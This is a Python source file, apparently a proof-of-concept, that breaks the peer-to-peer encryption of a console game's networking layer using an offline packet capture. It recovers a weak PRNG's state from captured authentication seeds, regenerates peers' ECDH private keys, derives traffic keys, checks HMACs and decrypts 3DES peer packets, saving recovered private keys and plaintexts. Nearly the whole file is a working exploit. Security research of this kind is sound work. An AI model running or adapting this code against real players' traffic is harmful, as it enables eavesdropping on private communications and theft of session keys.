"""Offline SvR test: recover PRNG state, regenerate ECDH keys, verify peer HMACs.

Uses only the supplied local capture and retail algorithm reconstructed from LBYM.
Does not connect to any server. Private keys/plaintexts stay in work/ artifacts.
"""
import argparse
import collections
import ctypes
import hashlib
import hmac
import json
from pathlib import Path
import struct
import subprocess
import tempfile
import time

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
from svr_capture import analyze, packets

MODULUS = 2147483647
INVERSE = pow(16807,-1,MODULUS)


def yarrow_private(entropy):
    # LBYM yarrow_start/add_entropy/ready/read: SHA256 pool, AES256 little-endian CTR.
    key = hashlib.sha256(bytes(32)+entropy).digest()
    counter = int.from_bytes(key[:16],'little')
    enc = Cipher(algorithms.AES(key),modes.ECB()).encryptor()
    raw = b''.join(enc.update((counter+i).to_bytes(16,'little')) for i in range(2))[:28]
    return int.from_bytes(raw,'big')


def tlv(data,pos=0):
    tag,n = data[pos:pos+2]
    pos += 2
    if n & 128:
        width = n & 127
        n = int.from_bytes(data[pos:pos+width],'big')
        pos += width
    return tag,data[pos:pos+n],pos+n


def public_key(blob):
    tag,body,_ = tlv(blob)
    if tag != 0x30:
        raise ValueError('not an ECC public key')
    fields,pos = [],0
    while pos < len(body):
        tag,value,pos = tlv(body,pos)
        fields.append((tag,value))
    if [x[0] for x in fields] != [3,2,2,2] or int.from_bytes(fields[1][1],'big') != 28:
        raise ValueError('not an ECC-224 public key')
    x,y = [int.from_bytes(v,'big') for _,v in fields[2:]]
    return ec.EllipticCurvePublicNumbers(x,y,ec.SECP224R1()).public_key()


def recover_states(word):
    # Keep generated native code outside the repository. Reuse it for this run.
    if not hasattr(recover_states,'lib'):
        recover_states.tmp = tempfile.TemporaryDirectory(prefix='svr-rng-')
        library = Path(recover_states.tmp.name)/'rng_probe.so'
        subprocess.run(['cc','-O3','-Wall','-Wextra','-fPIC','-shared','-o',str(library),
                        str(Path(__file__).with_name('svr_rng_probe.c'))],check=True)
        recover_states.lib = ctypes.CDLL(str(library))
    lib = recover_states.lib
    lib.recover.argtypes = [ctypes.c_uint32,ctypes.POINTER(ctypes.c_uint32),ctypes.c_uint]
    out = (ctypes.c_uint32*256)()
    n = lib.recover(word,out,len(out))
    if n > len(out):
        raise ValueError('candidate buffer too short')
    return list(out[:n])


def tiger(data):
    lib = ctypes.CDLL('libgcrypt.so.20')
    lib.gcry_check_version.argtypes = [ctypes.c_char_p]
    lib.gcry_check_version.restype = ctypes.c_char_p
    lib.gcry_check_version(None)
    lib.gcry_md_map_name.argtypes = [ctypes.c_char_p]
    algo = lib.gcry_md_map_name(b'TIGER')
    if not algo:
        raise RuntimeError('original Tiger unavailable')
    lib.gcry_md_hash_buffer.argtypes = [ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_size_t]
    out = ctypes.create_string_buffer(24)
    lib.gcry_md_hash_buffer(algo,out,data,len(data))
    return out.raw


def run(capture,max_rewind,outdir):
    if tiger(b'abc').hex() != '2aab1484e8c158f2bfb8c5ff41b57a525129131c957b5f93':
        raise RuntimeError('Tiger implementation does not match the retail variant')
    begin = time.monotonic()
    outdir.mkdir(parents=True,exist_ok=True)
    captured = list(packets(capture))
    meta = analyze(capture)
    pubs,aliases,primary,encrypted = {},collections.defaultdict(set),{},[]
    for timestamp,proto,flow,_,data in captured:
        if proto != 'udp':
            continue
        if data[:2] in (b'\3\2',b'\4\2') and len(data) in (106,169):
            pub = public_key(data[-100:])
            numbers = pub.public_numbers()
            identity = numbers.x,numbers.y
            pubs[identity] = pub
            aliases[identity].add(flow[:2])
            primary.setdefault(identity,flow[:2])
        elif data[:2] == b'\6\2' and len(data) >= 16:
            encrypted.append((timestamp,flow,data))
    print(f'Captured {len(meta["auth"])} auth seeds, {len(pubs)} peer public keys, {len(encrypted)} encrypted peer packets',flush=True)
    recovered = {}
    attempts = 0
    # The most recent login for an IP is usually the networking instance that
    # participated in the captured handshake. Public-key equality is the check.
    for auth in reversed(meta['auth']):
        word = int(auth['seed'],16)
        targets = [(identity,key) for identity,key in pubs.items()
                   if identity not in recovered and any(ep[0]==auth['flow'][0] for ep in aliases[identity])]
        if not targets:
            continue
        states = recover_states(word)
        print(f'Auth seed from {auth["flow"][0]} leaves {len(states)} PRNG candidates',flush=True)
        for first in states:
            history = [first & 255]
            s = first
            for _ in range(max_rewind+128):
                s = s*INVERSE % MODULUS
                history.append(s & 255)
            for gap in range(max_rewind+1):
                entropy = bytes(history[gap+128:gap:-1])
                private_int = yarrow_private(entropy)
                private = ec.derive_private_key(private_int,ec.SECP224R1())
                numbers = private.public_key().public_numbers()
                attempts += 1
                for identity,key in targets:
                    if identity not in recovered and numbers == key.public_numbers():
                        endpoint = primary[identity]
                        if endpoint[0] != auth['flow'][0]:
                            endpoint = next(ep for ep in sorted(aliases[identity]) if ep[0]==auth['flow'][0])
                        recovered[identity] = {'private':private,'gap':gap,'auth_seed':auth['seed'],'endpoint':endpoint}
                        print(f'EXACT PUBLIC-KEY MATCH: {endpoint[0]}:{endpoint[1]}, {gap} intervening RNG bytes',flush=True)
                if all(identity in recovered for identity,_ in targets):
                    break
            if all(identity in recovered for identity,_ in targets):
                break
    verified = collections.Counter()
    plaintexts = []
    sessions = []
    checked = set()
    opened = set()
    # Relay forwarding gives a console several visible endpoint aliases. Ports
    # can also be reused by a later login with a new key. Keep every public point
    # and let HMAC verification bind packets to a key rather than guessing from
    # an endpoint or stopping after the first recovered peer's associations.
    for identity,match in recovered.items():
        private = match['private']
        endpoint = match['endpoint']
        for other,pub in pubs.items():
            if other == identity:
                continue
            secret = private.exchange(ec.ECDH(),pub)
            if other in recovered:
                reverse = recovered[other]['private'].exchange(ec.ECDH(),pubs[identity])
                if secret != reverse:
                    raise ValueError('recovered peers disagree on shared secret')
            for room in meta['rooms']:
                key = tiger(secret+bytes.fromhex(room['key']))
                if key in checked:
                    continue
                checked.add(key)
                count = 0
                highest_sequence = collections.defaultdict(int)
                for index,(timestamp,flow,data) in enumerate(encrypted):
                    if index in opened:
                        continue
                    # bdDTLSData authenticates the base six-byte header and
                    # ciphertext/tail, skipping tag[8] and clear length[2].
                    signature = hmac.new(key,data[:6]+data[16:],hashlib.sha1).digest()[:8]
                    if not hmac.compare_digest(signature,data[6:14]):
                        continue
                    length = struct.unpack_from('<H',data,14)[0]
                    padded = (length+7)&~7
                    if 16+padded > len(data):
                        raise ValueError('authenticated packet contains an invalid payload length')
                    wire_sequence = struct.unpack_from('<H',data,4)[0]
                    high = highest_sequence[flow]
                    sequence = (high & ~0xffff) | wire_sequence
                    if sequence+0x8000 < high:
                        sequence += 0x10000
                    elif sequence > high+0x8000 and sequence >= 0x10000:
                        sequence -= 0x10000
                    highest_sequence[flow] = max(high,sequence)
                    iv = tiger(struct.pack('<I',sequence))[:8]
                    dec = Cipher(TripleDES(key),modes.CBC(iv)).decryptor()
                    plain = dec.update(data[16:16+padded])+dec.finalize()
                    plaintexts.append({'t':timestamp,'flow':flow,'sequence':sequence,'payload':plain[:length].hex(),'clear_tail':data[16+padded:].hex()})
                    opened.add(index)
                    verified[flow] += 1
                    count += 1
                if count:
                    remote = recovered[other]['endpoint'] if other in recovered else min(aliases[other])
                    sessions.append({'endpoint':endpoint,'remote':remote,'room_id':room['id'],'traffic_key':key.hex(),'private_key':private.private_numbers().private_value.to_bytes(28,'big').hex()})
    plaintexts.sort(key=lambda row:row['t'])
    report = {'auth_seed_count':len(meta['auth']),'peer_public_key_count':len(pubs),
              'recovered_private_key_count':len(recovered),'candidate_keys_tested':attempts,
              'recoveries':[{'endpoint':r['endpoint'],'intervening_rng_bytes':r['gap'],'auth_seed':r['auth_seed']} for r in recovered.values()],
              'verified_association_key_count':len(sessions),
              'encrypted_packet_count':len(encrypted),'verified_packet_count':sum(verified.values()),
              'verified_directions':[{'flow':f,'count':n} for f,n in verified.items()],
              'elapsed_seconds':round(time.monotonic()-begin,3)}
    (outdir/'report.json').write_text(json.dumps(report,indent=2)+'\n')
    if sessions:
        keypath = outdir/'recovered-keys.json'
        keypath.touch(mode=0o600,exist_ok=True)
        keypath.write_text(json.dumps(sessions,indent=2)+'\n')
    plaintext_path = outdir/'decrypted-peer.jsonl'
    plaintext_path.touch(mode=0o600,exist_ok=True)
    plaintext_path.write_text(''.join(json.dumps(x)+'\n' for x in plaintexts))
    print(json.dumps(report,indent=2))
    return report


if __name__=='__main__':
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('capture',type=Path)
    parser.add_argument('--max-rewind',type=int,default=4096)
    parser.add_argument('--output',type=Path,default=Path('work/svr-key-recovery'))
    args=parser.parse_args()
    if args.max_rewind < 0:
        parser.error('--max-rewind must be nonnegative')
    run(args.capture,args.max_rewind,args.output)
